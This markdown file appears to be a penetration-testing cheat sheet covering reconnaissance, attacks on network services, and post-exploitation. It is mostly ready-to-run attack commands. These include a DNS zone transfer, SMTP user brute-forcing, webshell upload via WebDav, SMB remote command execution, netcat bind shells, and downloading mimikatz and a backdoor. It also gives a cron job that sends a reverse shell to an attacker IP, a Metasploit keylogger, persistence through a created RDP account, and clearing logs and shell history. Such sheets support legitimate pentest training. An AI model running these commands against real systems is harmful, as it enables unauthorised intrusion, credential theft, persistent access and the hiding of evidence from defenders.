# Penetration test

## Information Gathering

```sh
# Standard whois tool
whois example.com

# DNS Manual Enumeration
dig +short a example.com # list of ipv4 address
dig +short mx example.com # list of email servers
dig +short -x <ip> # reverse lookups
dig +short ns example.com # list of DNS servers for the domain
dig axfr example.com @nsztm1.digi.ninja. # get a copy of the zone from the primary server. (zone transfer attack)

# Subdomain enumeration
sublist3r -d website.com

# Web App Technology Fingerprinting
whatweb website.com

# Hidden directory/files
http://website.com/robots.txt
http://website.com/sitemap.xml

# WAF Detection
wafw00f http://website.com -a

# Names, Emails, IPs, Subdomains, and URLs from multiple public resources
theHarvester -d example.com -b google,linkedin,dnsdumpster,duckduckgo

# Host Discovery
nmap -sn 192.168.1.0/24 # ICMP for external network, ARP for local
nmap -sn -PS 192.168.1.5 # TCP SYN flag set (default port: 80)
nmap -sn -PS22-25 192.168.1.5 # TCP SYN flag set (port 22,23,24,25)
nmap -sn -PA 192.168.1.5 # TCP ACK flag set (default port: 80)
nmap -sn -PU 192.168.1.5 # UDP (default port: 40125)
nmap -sn -PY 192.168.1.5 # SCTP (default port: 80)

nmap -p- 192.168.1.5 # Scan all TCP ports
nmap -sU --top-ports 25 <ip> # Scan top 25 UDP ports 
```



## Network Services Exploitation

```sh
# 21 - FTP
ftp <ip> 

# 22 - SSH
ssh <username>@<ip>

# 25 - SMTP
nc <ip> <port> # Get domain name
smtp-user-enum -U <directory_path> -t <ip> # Automatic Username Bruteforce
# Manual Username Bruteforce
nc <ip> <port>
220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
VRFY  root
252 2.0.0 root    # Output if user exists
VRFY  idontexists
550 5.1.1 <idontexists>: Recipient address rejected: User unknown in local recipient table

# 80 - WebDav
davtest -auth <user>:<password> -url http://<ip>/<webdav_path> # Check what file type is executed
davtest --url http://<ip>/<webdav_path> -auth <user>:<password> -uploadfile /path/to/webshell.asp -uploadloc /destination/webshell.asp # Upload file
cadaver http://<ip>/<path_to_webdav> # Login and then upload file with PUT command

# 139/445 - SMB | Samba
smbclient --no-pass -L //<IP> # List shared folders (Null user)
smbclient -U 'admin%admin' -L //<ip> # List shared folders (Authenticate)
enum4linux -a [-u "<username>" -p "<passwd>"] <IP> # Obtain Information
smbmap -H <ip> -u <user> -p <pass> -x 'ipconfig' # Command execution (authenticated)
python3 psexec.py Administrator@ip  # Command execution (works also with NT hashes as password)

# 3306 - MYSQL
mysql -h <hostname> -u root # without password
mysql -h <hostname> -u root -p # with password

# 3389 - RDP
xfreerdp /v:<ip> /u:<username> /p:<password> # Connect to RDP
auxiliary/scanner/rdp/rdp_scanner # Metasploit (If you are not sure that specific port runs rdp)
```



## Post-Exploitation

```sh
# Bind Shell
nc -nvlp <PORT> -e cmd.exe or nc.exe -nvlp <PORT> -e cmd.exe # Windows (target)
nc -nvlp <PORT> -e /bin/bash # Linux (target)
nc -nv <IP> <PORT> # Linux (attacker)
nc.exe -nv <IP> <PORT> # Windows (attacker)

# Transfer files
certutil -urlcache -f http://<host>/mimikatz.exe mimikatz.exe # Windows
wget http://<host>/backdoor.php # Linux
# Netcat
nc -nvlp 1234 > test.txt # recepient
nc -nv <ip> <port> < test.txt # sender

# Interactive shell
/bin/bash -i # Linux

# Fully interactive shell
# 1 step
python3 -c 'import pty;pty.spawn("/bin/bash")' # or 
python -c 'import pty;pty.spawn("/bin/bash")'
# 2 step 
Press CTRL + Z # to background process and get back to your host machine
# 3 step
stty raw -echo; fg
# 4 step
export TERM=xterm

# Keylogger (Metasploit)
keyscan_start # start keylogger
keyscan_dump # print captured strokes

# Pivoting (meterpreter)
run autoroute -s <subnet> # subnet of the internal network
run autoroute -p # Displays active routing table.

# Port forwarding (meterpreter/metasploit)
portfwd add -l 1234 -p 80 -r <target_sys_2_ip> # port 80 of the target 2
portfwd list
nmap -sV -sC -p 1234 localhost

# Persistence 
# Windows
exploit/windows/local/persistence_service # [metasploit] search "persistence" example
post/windows/manage/enable_rdp # [metasploit] windows persistence by enabling rdp (Require user & pass. No pass? change or crack it) 
run getgui -e -u user_you_want -p password_you_want # [meterpreter] (automatic Enables RDP & creates user & other thing)
# Linux example
post/linux/manage/sshkey_persistence # [metasploit] search "persistence" example
# Linux cron jobs
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" > cron # create a cronjob (every minute time format)
crontab -i cron
crontab -l # crontab for the current user

# Clearing tracks
clearev # Windows (meterpreter)
history -c # Linux
```
